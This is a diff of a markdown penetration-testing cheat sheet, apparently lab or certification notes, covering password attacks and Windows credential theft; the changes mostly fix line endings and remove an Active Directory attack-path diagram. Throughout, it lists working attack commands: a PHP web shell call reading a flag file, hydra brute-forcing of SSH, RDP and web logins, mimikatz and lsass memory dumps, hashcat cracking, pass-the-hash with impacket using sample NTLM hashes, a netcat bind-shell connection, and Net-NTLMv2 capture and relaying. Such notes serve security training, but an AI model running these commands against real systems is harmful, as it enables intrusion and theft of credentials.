@@ -605,13 +605,13 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - `http://192.168.171.52/cmsms/uploads/shell.php?cmd=cat /home/flag.txt`    
 
 # Password attack  
-- SSH
+- SSH  
   `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`
-- RDP
+- RDP  
   `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`  
-- http POST login
+- http POST login  
   `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`
-- Obtain hashes
+- Obtain hashes  
   - `.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit`
   - `.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit`
   - `rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump  lsass.exe C:\temp\lsass.dmp full` #LSASS Memory Dump + PyPyKatz
@@ -622,9 +622,9 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 
     secretsdump.py -sam /home/kali/uploads/sam -system /home/kali/uploads/system LOCAL   
     ```
-- crack NTLM 1000
+- crack NTLM 1000  
   `hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`    
-- mutating wordlist
+- mutating wordlist  
   - [rule-based attack](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
     - `ls -la /usr/share/hashcat/rules/`  
     - Append character X to end: $1$2
@@ -655,7 +655,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
       Umbrella137!
       ```
 - `hash-identifier "4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7"`
-- Password manager (KeePass)
+- Password manager (KeePass)  
   ```
   Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue #search DB
   keepass2john Database.kdbx > keepass.hash #format the hash
@@ -675,7 +675,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   chmod 600 id_rsa
   ssh -i id_rsa -p 2222 dave@192.168.50.201 #login
   ```
-- Passing NTLM (User + Hash)
+- Passing NTLM (User + Hash)  
   - scenario: user from FILES01 extract admin hash and authenticate to FILES02 SMB share  
   ```
   .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
@@ -688,7 +688,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
   C:\Windows\system32> hostname
   ```
-- Net-NTLMv2 challenge–response hash (cannot run Mimikatz as an unprivileged user )
+- Net-NTLMv2 challenge–response hash (cannot run Mimikatz as an unprivileged user)  
   - Only exists during authentication traffic SMB
   - connect to bind shell on port 4444  
     `nc 192.168.139.211 4444`  
@@ -700,7 +700,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - responder capturing the Net-NTLMv2 hash of paul.
     [SMB] NTLMv2-SSP Hash :paul::FILES01:1f9d4c51f6e74653:795F138EC6
   - `hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force`  #crack Net-NTLMv2 5600
-- Relaying Net-NTLMv2 (cannot run Mimikatz as an unprivileged user + failed to crack Net-NTLMv2 hash)
+- Relaying Net-NTLMv2 (cannot run Mimikatz as an unprivileged user + failed to crack Net-NTLMv2 hash)  
   - Starting ntlmrelayx for a Relay-attack targeting FILES02
     ```
     pwsh
@@ -721,56 +721,14 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     C:\Windows\system32>dir \\192.168.119.2\test
     ```
   - receive an incoming connection in our ntlmrelayx tab
-- Windows credential guard
+- Windows credential guard  
   - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)
     `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`  
 
 # Remote to other machines
 
 # Active directory  
-[Initial Access]
-      │
-      ▼
-[Low-Priv User on Workstation]
-      │  (exploit vulnerable service, password guessing, phishing)
-      ▼
-[Local Admin on Host]
-      │
-      ├─ Tools:
-      │    • Mimikatz (sekurlsa::logonpasswords, lsadump::sam)
-      │    • WinPEAS / LinPEAS (privilege enumeration)
-      │    • JuicyPotato / RottenPotatoNG (token impersonation)
-      │
-      ▼
-[Dump Local & Cached Credentials]
-      │
-      ├─ Potential data:
-      │    • Local NTLM hashes
-      │    • Cached Domain User creds
-      │
-      ▼
-[Domain User / Service Account]
-      │
-      ├─ Techniques:
-      │    • Kerberoasting (extract service account hashes)
-      │    • Pass-the-Hash / Pass-the-Ticket (move laterally)
-      │
-      ▼
-[Access to Target DC or High-Priv Domain Host]
-      │
-      ├─ Tools:
-      │    • Mimikatz DCSync
-      │    • Impacket secretsdump.py
-      │
-      ▼
-[Domain Admin Compromise]
-      │
-      ├─ Outcome:
-      │    • Full AD control
-      │    • Dump all user hashes
-      │    • Pivot to other hosts at will
-      ▼
-[Lab / Network Fully Compromised]
+
 
 # Top tools and command  
 1. **hashcat**: Cracking NTLM / Kerberos hashes  
